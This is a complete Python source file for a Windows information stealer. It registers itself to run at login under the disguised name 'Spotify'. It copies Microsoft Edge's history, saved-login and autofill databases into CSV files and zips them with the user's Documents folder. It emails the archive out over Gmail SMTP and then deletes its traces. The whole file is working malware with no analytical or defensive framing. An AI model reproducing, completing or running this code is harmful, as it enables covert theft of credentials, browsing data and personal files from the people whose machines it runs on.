import shutil
import tempfile
import os
import zipfile
import smtplib
import sqlite3
import csv
import sys
import winreg
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText


class FileZipper:
    def __init__(self, folder_paths, output_zip):
        self.folder_paths = folder_paths
        self.output_zip = output_zip

    def zip_folders(self):
        try:
            with zipfile.ZipFile(self.output_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zipf:
                for folder in self.folder_paths:
                    for root, _, files in os.walk(folder):
                        for file in files:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(folder)))
            print(f"Zipped files into {self.output_zip}")
        except Exception as e:
            print(f"Error zipping folders: {e}")


class DatabaseExtractor:
    def __init__(self, db_path):
        self.db_path = db_path

    def extract_tables(self, tables_to_extract, output_dir):
        os.makedirs(output_dir, exist_ok=True)

        with tempfile.NamedTemporaryFile(delete=False) as temp_db:
            try:
                shutil.copy2(self.db_path, temp_db.name)
                with sqlite3.connect(f'file:{temp_db.name}?mode=ro', uri=True) as conn:
                    for table in tables_to_extract:
                        self._extract_table_to_csv(conn, table, output_dir)
            except Exception as e:
                print(f"Error extracting tables: {e}")
            finally:
                try:
                    os.remove(temp_db.name)
                except:
                    pass

    def _extract_table_to_csv(self, conn, table, output_dir):
        output_file = os.path.join(output_dir, f"{table}.csv")
        try:
            cursor = conn.execute(f"SELECT * FROM {table}")
            column_names = [description[0] for description in cursor.description]

            with open(output_file, mode='w', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow(column_names)
                writer.writerows(cursor)
            print(f"Extracted {table} to {output_file}")
        except Exception as e:
            print(f"Could not extract table '{table}': {e}")


class EmailSender:
    def __init__(self, smtp_server, smtp_port, sender_email, sender_password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password

    def send_email(self, recipient_email, subject, body, attachment):
        msg = MIMEMultipart()
        msg['From'] = self.sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        self._attach_file(msg, attachment)

        try:
            with smtplib.SMTP(self.smtp_server, int(self.smtp_port)) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)
            print("Email sent successfully!")
        except Exception as e:
            print(f"Could not send email: {e}")

    def _attach_file(self, msg, attachment):
        try:
            with open(attachment, 'rb') as attach_file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attach_file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
                msg.attach(part)
        except Exception as e:
            print(f"Could not attach file: {e}")


def cleanup(files_and_dirs):
    for path in files_and_dirs:
        try:
            if os.path.isfile(path):
                try:
                    os.remove(path)
                except Exception as e:
                    print(f"Error removing {path}: {e}")
            elif os.path.isdir(path):
                shutil.rmtree(path)
        except Exception as e:
            print(f"Error cleaning up {path}: {e}")


def startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        script_path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, "Spotify", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print("Added to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")


if __name__ == "__main__":
    startup()

    documents_folder = os.path.expanduser('~/Documents')
    extracted_data_folder = "extracted_data"
    final_zip_file = 'final_output.zip'

    edge_db_paths = [
        os.path.expanduser('~/AppData/Local/Microsoft/Edge/User Data/Default/History'),
        os.path.expanduser('~/AppData/Local/Microsoft/Edge/User Data/Default/Login Data'),
        os.path.expanduser('~/AppData/Local/Microsoft/Edge/User Data/Default/Web Data')
    ]
    tables_to_extract = {
        "History": ["urls", "visits"],
        "Login Data": ["logins"],
        "Web Data": ["autofill"]
    }

    os.makedirs(extracted_data_folder, exist_ok=True)  # Create the extracted_data folder

    for db_path in edge_db_paths:
        db_name = os.path.basename(db_path).split('.')[0]
        extractor = DatabaseExtractor(db_path)
        if db_name in tables_to_extract:
            extractor.extract_tables(tables_to_extract[db_name], extracted_data_folder)

    file_zipper = FileZipper([documents_folder, extracted_data_folder], final_zip_file)
    file_zipper.zip_folders()

    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    sender_email = ''
    sender_password = ''
    recipient_email = ''
    subject = 'Extracted Files'
    body = f'Time: {time.ctime()}'
    email_sender = EmailSender(smtp_server, smtp_port, sender_email, sender_password)
    email_sender.send_email(recipient_email, subject, body, final_zip_file)

    cleanup([extracted_data_folder, final_zip_file])
